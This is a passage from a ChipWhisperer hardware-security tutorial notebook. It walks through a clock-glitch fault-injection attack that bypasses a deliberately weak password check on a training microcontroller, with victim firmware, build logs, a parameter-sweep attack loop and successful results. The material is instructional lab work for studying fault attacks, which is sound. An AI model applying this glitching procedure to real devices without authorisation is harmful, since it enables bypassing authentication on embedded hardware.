cycle where the glitch succeeds. To save time, pick a ``width`` and
``offset`` that worked for you and only vary ``ext_offset``. Note that
even with the right parameters and location, inserting a glitch won't
always work, so a better strategy may be to loop infinitely over
``ext_offset`` values until you get a successful glitch.

**HINT: We used a ``repeat`` of 105 for this attack (and an
``ext_offset`` of 0) on XMEGA, which put a glitch in each of the first
105 clock cycles. This means ``ext_offset`` must be in the range
``[0,105]`` for this target.**

Attack 2
--------

Now that you (hopefully) have parameters that cause semi-reliable
glitches, we can look at a more challenging example: a password check.
Go back to ``glitchsimple.c`` and find the ``glitch3()`` function:

.. code:: c

    void glitch3(void)
    {
        char inp[16];
        char c = 'A';
        unsigned char cnt = 0;
        uart_puts("Password:");

        while((c != '\n') & (cnt < 16)){
            c = getch();
            inp[cnt] = c;
            cnt++;
        }

        char passwd[] = "touch";
        char passok = 1;

        trigger_high();
        trigger_low();

        //Simple test - doesn't check for too-long password!
        for(cnt = 0; cnt < 5; cnt++){
            if (inp[cnt] != passwd[cnt]){
                passok = 0;
            }
        }

        if (!passok){
            uart_puts("Denied\n");
        } else {
            uart_puts("Welcome\n");
        }
    }

As you might expect, we'll try to glitch past the ``if(!passok)`` check
towards the end of the code. Like before, we'll build and program the
new firmware, using ``FUNC_SEL`` to build with ``glitch3()``.


**In [11]:**

.. code:: bash

    %%bash -s "$PLATFORM" "$CRYPTO_TARGET"
    cd ../hardware/victims/firmware/glitch-simple
    make PLATFORM=$1 CRYPTO_TARGET=$2 FUNC_SEL=GLITCH3


**Out [11]:**



.. parsed-literal::

    rm -f -- glitchsimple-CWLITEARM.hex
    rm -f -- glitchsimple-CWLITEARM.eep
    rm -f -- glitchsimple-CWLITEARM.cof
    rm -f -- glitchsimple-CWLITEARM.elf
    rm -f -- glitchsimple-CWLITEARM.map
    rm -f -- glitchsimple-CWLITEARM.sym
    rm -f -- glitchsimple-CWLITEARM.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- glitchsimple.s simpleserial.s stm32f3_hal.s stm32f3_hal_lowlevel.s stm32f3_sysmem.s
    rm -f -- glitchsimple.d simpleserial.d stm32f3_hal.d stm32f3_hal_lowlevel.d stm32f3_sysmem.d
    rm -f -- glitchsimple.i simpleserial.i stm32f3_hal.i stm32f3_hal_lowlevel.i stm32f3_sysmem.i
    .
    -------- begin --------
    arm-none-eabi-gcc (GNU Tools for Arm Embedded Processors 7-2018-q2-update) 7.3.1 20180622 (release) [ARM/embedded-7-branch revision 261907]
    Copyright (C) 2017 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: glitchsimple.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -DGLITCH3 -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/glitchsimple.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/glitchsimple.o.d glitchsimple.c -o objdir/glitchsimple.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -DGLITCH3 -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -DGLITCH3 -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal.o.d .././hal/stm32f3/stm32f3_hal.c -o objdir/stm32f3_hal.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal_lowlevel.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -DGLITCH3 -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal_lowlevel.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal_lowlevel.o.d .././hal/stm32f3/stm32f3_hal_lowlevel.c -o objdir/stm32f3_hal_lowlevel.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_sysmem.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -DGLITCH3 -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_sysmem.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_sysmem.o.d .././hal/stm32f3/stm32f3_sysmem.c -o objdir/stm32f3_sysmem.o 
    .
    Assembling: .././hal/stm32f3/stm32f3_startup.S
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir/stm32f3_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f3/stm32f3_startup.S -o objdir/stm32f3_startup.o
    .
    Linking: glitchsimple-CWLITEARM.elf
    arm-none-eabi-gcc -mcpu=cortex-m4 -I. -DGLITCH3 -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/glitchsimple.o -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/glitchsimple-CWLITEARM.elf.d objdir/glitchsimple.o objdir/simpleserial.o objdir/stm32f3_hal.o objdir/stm32f3_hal_lowlevel.o objdir/stm32f3_sysmem.o objdir/stm32f3_startup.o --output glitchsimple-CWLITEARM.elf --specs=nano.specs -T .././hal/stm32f3/LinkerScript.ld -Wl,--gc-sections -lm -Wl,-Map=glitchsimple-CWLITEARM.map,--cref   -lm  
    .
    Creating load file for Flash: glitchsimple-CWLITEARM.hex
    arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature glitchsimple-CWLITEARM.elf glitchsimple-CWLITEARM.hex
    .
    Creating load file for EEPROM: glitchsimple-CWLITEARM.eep
    arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    	--change-section-lma .eeprom=0 --no-change-warnings -O ihex glitchsimple-CWLITEARM.elf glitchsimple-CWLITEARM.eep || exit 0
    .
    Creating Extended Listing: glitchsimple-CWLITEARM.lss
    arm-none-eabi-objdump -h -S -z glitchsimple-CWLITEARM.elf > glitchsimple-CWLITEARM.lss
    .
    Creating Symbol Table: glitchsimple-CWLITEARM.sym
    arm-none-eabi-nm -n glitchsimple-CWLITEARM.elf > glitchsimple-CWLITEARM.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       4400	      8	   1176	   5584	   15d0	glitchsimple-CWLITEARM.elf
    +--------------------------------------------------------
    + Built for platform CW-Lite Arm (STM32F3)
    +--------------------------------------------------------




**In [12]:**

.. code:: ipython3

    cw.program_target(scope, prog, fw_path)


**Out [12]:**



.. parsed-literal::

    Detected known STMF32: STM32F302xB(C)/303xB(C)
    Extended erase (0x44), this can take ten seconds or more
    Attempting to program 4407 bytes at 0x8000000
    STM32F Programming flash...
    STM32F Reading flash...
    Verified flash OK, 4407 bytes
    


Now let's make sure we can communicate with the password check with a
successful password:


**In [13]:**

.. code:: ipython3

    target.flush()
    scope.arm()
    target.write("touch\n")
    
    ret = scope.capture()
    if ret:
        print("Scope capture timed out")
    response = target.read(timeout = 10)
    print(response)


**Out [13]:**



.. parsed-literal::

    Welcome
    Password:
    


and an unsuccessful one:


**In [14]:**

.. code:: ipython3

    target.flush()
    scope.arm()
    target.write("x\n")
    
    ret = scope.capture()
    if ret:
        print("Scope capture timed out")
    response = target.read(timeout = 10)
    print(response)


**Out [14]:**



.. parsed-literal::

    Denied
    Password:
    


One thing that you may have run into in the previous part is that using
a large repeat value makes the target more likely to crash. As mentioned
in the previous part, we can use smaller ranges of offset and width, use
a repeat value of 1, and iterate through the external offset instead to
get a successful glitch. This is often a much more reliable way to
glitch targets.

One other thing we need to consider is crashing. In the previous part,
we didn't need to worry about crashing since we always reset after a
glitch attempt anyway. This is no longer true. Instead we'll need to
detect glitches and, if they happen, reset the target. Typically a good
way to detect crashes is by running through the loop again and looking
for a timeout. This is rather slow, but for this attack, we don't really
have a better method. One thing we can do to speed this up is to
decrease the adc timeout value (via ``scope.adc.timeout``). Resetting is
the same in the last part.

Putting it all together (don't forget to update the width and offset
with ranges that worked in the last part):

Attack Loop
~~~~~~~~~~~


**In [15]:**

.. code:: ipython3

    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "clock_xor"
    scope.glitch.trigger_src = "ext_single"
    scope.glitch.repeat = 1
    scope.glitch.ext_offset = 0
    scope.io.hs2 = "glitch"
    
    attack2_data = []
    scope.adc.timeout = 0.1
    if PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
        pass
    elif PLATFORM == "CWLITEARM" or PLATFORM == "CW308_STM32F3":
        offset_range = Range(-41, -35, 1)
        width_range = Range(-10, -5, 1)
    
    scope.glitch.width = width_range.min
    while scope.glitch.width < width_range.max:
        scope.glitch.offset = offset_range.min
        while scope.glitch.offset < offset_range.max:
            for i in range(0, 20):
                scope.glitch.ext_offset = i
                target.flush()
                scope.arm()
                target.write("x\n")
                
                ret = scope.capture()
                if ret:
                    print('Timeout happened during acquisition')
                    reset_target(scope)
                    
                # read from the targets buffer
                response = target.read(timeout = 10)
    
                # for table display purposes
                success = 'Welcome' in repr(response) # check for glitch success (depends on targets active firmware)
                attack2_data.append([scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset, success, repr(response)])
            scope.glitch.offset += offset_range.step
        scope.glitch.width += width_range.step
    print("Done glitching")


**Out [15]:**



.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    




.. parsed-literal::

    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    WARNING:root:Timeout in OpenADC capture(), trigger FORCED
    




.. parsed-literal::

    Timeout happened during acquisition
    Done glitching
    



**In [16]:**

.. code:: ipython3

    print(scope.adc.trig_count)
    for row in attack2_data:
        if row[3]:
            print(row)


**Out [16]:**



.. parsed-literal::

    56
    [-39.84375, -10.15625, 10, True, "'Welcome\\nPassword:'"]
    [-41.015625, -8.984375, 10, True, "'Welcome\\nPassword:'"]
    [-39.84375, -8.984375, 10, True, "'Welcome\\nPassword:'"]
    [-41.015625, -7.8125, 10, True, "'Welcome\\nPassword:'"]
    [-39.84375, -7.8125, 10, True, "'Welcome\\nPassword:'"]
    [-41.015625, -6.640625, 10, True, "'Welcome\\nPassword:'"]
    [-39.84375, -6.640625, 10, True, "'Welcome\\nPassword:'"]
    [-41.015625, -5.46875, 10, True, "'Welcome\\nPassword:'"]
    [-39.84375, -5.46875, 10, True, "'Welcome\\nPassword:'"]
    


With any luck, you should have some successful attacks. If you weren't
able to glitch the target, you may want to try a larger range of
width/offset values. You may also want to try decreasing the step value
for these ranges as well.

With the tutorial now over, we should disconnect from the ChipWhisperer


**In [17]:**

.. code:: ipython3

    scope.dis()
    target.dis()

Glitching Onward
----------------

This basic tutorial has introduced you to glitch attacks. They are a
powerful tool for bypassing authentication in embedded hardware devices.
There are many ways to expand your knowledge with additional practice,
such as:

-  Manual glitches can be triggered by calling
   ``scope.glitch.manualTrigger()`` and
   ``scope.glitch.trigger_src = "manual"``. Try using manual glitches to
   simply glitch past the prompt in ``glitch3()``.
-  Completing the VCC Glitch Attacks tutorial (not yet available), which
   introduces glitching via voltage instead of the clock.
-  Download some example source code (bootloaders, login prompts, etc)
   and port them to your target. See how you can glitch past security
   checks.
-  Use one of the IO triggers discussed in
   Tutorial\_A1\_Synchronization\_to\_Communication\_Lines.

Tests
-----


**In [18]:**

.. code:: ipython3

    success = False
    for row in attack1_data:
        if row[2] > 0:
            success = True
    assert success, "Failed to glitch attack 1\n{}".format(attack1_data)


**In [19]:**

.. code:: ipython3

    success = False
    for row in attack2_data:
        if row[3]:
            success = True
    assert success, "Failed to glitch attack 2\n{}".format(attack2_data)


**In [ ]:**

